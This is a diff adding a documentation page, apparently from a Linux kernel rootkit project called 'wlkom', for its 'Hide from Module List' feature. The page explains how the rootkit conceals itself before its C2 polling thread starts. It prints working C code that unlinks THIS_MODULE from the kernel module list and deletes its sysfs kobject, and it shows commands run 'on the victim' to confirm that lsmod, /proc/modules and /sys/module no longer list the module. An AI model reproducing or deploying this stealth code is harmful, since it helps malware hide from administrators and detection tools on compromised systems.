@@ -1,0 +1,110 @@
+---
+import FeaturePage from '../../layouts/FeaturePage.astro';
+---
+
+<FeaturePage
+  title="Hide from Module List"
+  description="The module removes itself from lsmod, /proc/modules and /sys/module/ immediately on load."
+  badge="Optional"
+  points="1 pt"
+  slug="hide-module"
+>
+
+<section class="section">
+  <h2 class="section-title">// How it works</h2>
+  <div class="prose">
+    <p>
+      The Linux kernel maintains two data structures that expose loaded modules to userland:
+    </p>
+    <ul>
+      <li>A <strong>doubly-linked list</strong> of <code>struct module</code> accessible via <code>/proc/modules</code> (and <code>lsmod</code>).</li>
+      <li>A <strong>kobject</strong> in sysfs under <code>/sys/module/</code>.</li>
+    </ul>
+    <p>
+      <code>hide_module()</code> simply removes <code>THIS_MODULE</code> from both. This is done <em>before</em>
+      the C2 polling thread is started, so by the time the rootkit makes its first network request,
+      it is already invisible.
+    </p>
+  </div>
+</section>
+
+<section class="section">
+  <h2 class="section-title">// Before / After</h2>
+  <div class="diagram">
+    <svg viewBox="0 0 680 220" xmlns="http://www.w3.org/2000/svg" font-family="'Courier New',monospace">
+      <!-- BEFORE -->
+      <text x="170" y="22" text-anchor="middle" fill="#e3b341" font-size="11" font-weight="bold">BEFORE — lsmod shows wlkom</text>
+      <rect x="20"  y="35" width="130" height="40" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+      <text x="85"  y="55" text-anchor="middle" fill="#8b949e" font-size="10">module_a</text>
+      <text x="85"  y="68" text-anchor="middle" fill="#8b949e" font-size="9">list_head</text>
+      <line x1="150" y1="55" x2="175" y2="55" stroke="#30363d" stroke-width="1.5"/>
+      <rect x="175" y="35" width="130" height="40" rx="4" fill="#161b22" stroke="#e3b341" stroke-width="1" stroke-opacity="0.7"/>
+      <text x="240" y="55" text-anchor="middle" fill="#e3b341" font-size="10">wlkom</text>
+      <text x="240" y="68" text-anchor="middle" fill="#8b949e" font-size="9">list_head</text>
+      <line x1="305" y1="55" x2="330" y2="55" stroke="#30363d" stroke-width="1.5"/>
+      <rect x="330" y="35" width="130" height="40" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+      <text x="395" y="55" text-anchor="middle" fill="#8b949e" font-size="10">module_b</text>
+      <text x="395" y="68" text-anchor="middle" fill="#8b949e" font-size="9">list_head</text>
+
+      <!-- AFTER -->
+      <text x="170" y="130" text-anchor="middle" fill="#00ff41" font-size="11" font-weight="bold">AFTER — wlkom invisible</text>
+      <rect x="20"  y="143" width="130" height="40" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+      <text x="85"  y="163" text-anchor="middle" fill="#8b949e" font-size="10">module_a</text>
+      <text x="85"  y="176" text-anchor="middle" fill="#8b949e" font-size="9">list_head</text>
+      <line x1="150" y1="163" x2="330" y2="163" stroke="#00ff41" stroke-width="1.5"/>
+      <rect x="330" y="143" width="130" height="40" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+      <text x="395" y="163" text-anchor="middle" fill="#8b949e" font-size="10">module_b</text>
+      <text x="395" y="176" text-anchor="middle" fill="#8b949e" font-size="9">list_head</text>
+      <!-- ghost wlkom -->
+      <rect x="175" y="143" width="130" height="40" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1" stroke-dasharray="4,3" opacity="0.3"/>
+      <text x="240" y="163" text-anchor="middle" fill="#30363d" font-size="10">wlkom (hidden)</text>
+
+      <!-- kobject -->
+      <text x="550" y="22" text-anchor="middle" fill="#8b949e" font-size="10">/sys/module/</text>
+      <rect x="490" y="35" width="120" height="30" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+      <text x="550" y="55" text-anchor="middle" fill="#8b949e" font-size="10">wlkom/ (removed)</text>
+      <line x1="550" y1="65" x2="550" y2="80" stroke="#30363d" stroke-width="1" stroke-dasharray="3,3"/>
+      <text x="550" y="93" text-anchor="middle" fill="#8b949e" font-size="10">kobject_del()</text>
+    </svg>
+  </div>
+</section>
+
+<section class="section">
+  <h2 class="section-title">// Implementation</h2>
+  <div class="code-block">
+    <div class="code-header"><span>rootkit/src/hide.c</span><span class="lang">C</span></div>
+    <pre><code>{`void hide_module(void)
+{
+    // Remove from the kernel's module list → invisible in lsmod
+    // and /proc/modules
+    list_del_init(&THIS_MODULE->list);
+
+    // Remove the kobject from sysfs → invisible in /sys/module/
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+}`}</code></pre>
+  </div>
+  <div class="callout">
+    <span class="callout-icon">💡</span>
+    <p><strong>list_del_init</strong> unlinks the node from the doubly-linked list and reinitialises its pointers to point to itself — safe for subsequent list operations. The module object remains in memory and fully functional; it is simply no longer reachable from the public list traversal.</p>
+  </div>
+</section>
+
+<section class="section">
+  <h2 class="section-title">// Verification</h2>
+  <div class="code-block">
+    <div class="code-header"><span>On the victim after insmod</span></div>
+    <pre><code>{`$ lsmod | grep wlkom
+# no output — module is hidden
+
+$ cat /proc/modules | grep wlkom
+# no output
+
+$ ls /sys/module/ | grep wlkom
+# no output
+
+$ dmesg | tail -3
+# kernel log still shows: c2: registered uuid=...`}</code></pre>
+  </div>
+</section>
+
+</FeaturePage>
